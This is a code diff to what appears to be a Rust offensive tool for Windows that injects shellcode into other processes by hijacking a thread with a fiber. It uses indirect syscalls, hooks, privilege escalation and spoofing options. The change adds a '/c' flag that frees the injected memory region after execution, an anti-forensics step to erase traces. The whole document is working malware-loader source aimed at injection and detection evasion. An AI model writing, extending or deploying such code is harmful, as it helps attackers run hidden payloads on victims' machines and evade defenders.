@@ -21,21 +21,22 @@ mod missed_calls;
 
 use std::{
     ffi::c_void,
-    mem::{self, size_of},
-    ptr::{self, copy_nonoverlapping, null_mut},
+    mem,
+    ptr::{self, copy_nonoverlapping},
     vec::Vec,
+    time::Duration,
+    thread,
 };
 use crate::hooks::{initialize_hooks, destroy_hooks};
 pub use indirect_lib::{get_ssn_by_name, set_hw_bp};
 
 use windows::{
-    core::{s, Error, PCSTR, PSTR, Result},
+    core::{s, Error, PCSTR, Result},
     Win32::System::{
-        Diagnostics::Debug::ReadProcessMemory,
         LibraryLoader::{GetProcAddress, LoadLibraryA},
         Memory::{
             VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE,
-            PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
+            PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
         },
         Threading::{
             ConvertThreadToFiber, CreateFiber, GetCurrentProcess, SwitchToFiber,
@@ -58,6 +59,8 @@ fn main() -> Result<()> {
         let use_spoofing = args.iter().any(|arg| arg == "/s");
         // check if delete flag
         let use_delete = args.iter().any(|arg| arg == "/d");
+        // check if cleanup flag
+        let use_cleanup = args.iter().any(|arg| arg == "/c");
 
         // enable SeDebugPrivilege if admin
         let _is_admin = is_admin::is_admin();
@@ -223,8 +226,19 @@ fn main() -> Result<()> {
                                 let h_thread = pi.hThread;
 
                                 match remote_fiber::hijack_thread_with_fiber(h_process, h_thread, &shellcode) {
-                                     Ok(_) => {
+                                     Ok((addr, _size)) => {
                                          println!("[+] Success!");
+                                         if use_cleanup {
+                                             thread::sleep(Duration::from_millis(500));
+                                             let mut region_size: usize = 0;
+                                             let mut base_addr = addr;
+                                             missed_calls::nt_free_virtual_memory(
+                                                h_process.0 as *mut winapi::ctypes::c_void,
+                                                &mut base_addr as *mut *mut std::ffi::c_void as *mut *mut winapi::ctypes::c_void,
+                                                &mut region_size as *mut usize as *mut winapi::shared::basetsd::SIZE_T,
+                                                0x8000
+                                             );
+                                         }
                                          let _ = windows::Win32::Foundation::CloseHandle(h_thread);
                                          let _ = windows::Win32::Foundation::CloseHandle(h_process);
                                          spoofing_successful = true;
@@ -281,7 +295,18 @@ fn main() -> Result<()> {
                     };
 
                     match remote_fiber::hijack_thread_with_fiber(h_process, h_thread, &shellcode) {
-                        Ok(_) => {
+                        Ok((addr, _size)) => {
+                            if use_cleanup {
+                                 thread::sleep(Duration::from_millis(500));
+                                 let mut region_size: usize = 0;
+                                 let mut base_addr = addr;
+                                 missed_calls::nt_free_virtual_memory(
+                                    h_process.0 as *mut winapi::ctypes::c_void,
+                                    &mut base_addr as *mut *mut std::ffi::c_void as *mut *mut winapi::ctypes::c_void,
+                                    &mut region_size as *mut usize as *mut winapi::shared::basetsd::SIZE_T,
+                                    0x8000
+                                 );
+                            }
                             let _ = remote_fiber::close_thread_handle(h_thread);
                             injection_success = true;
                             break;
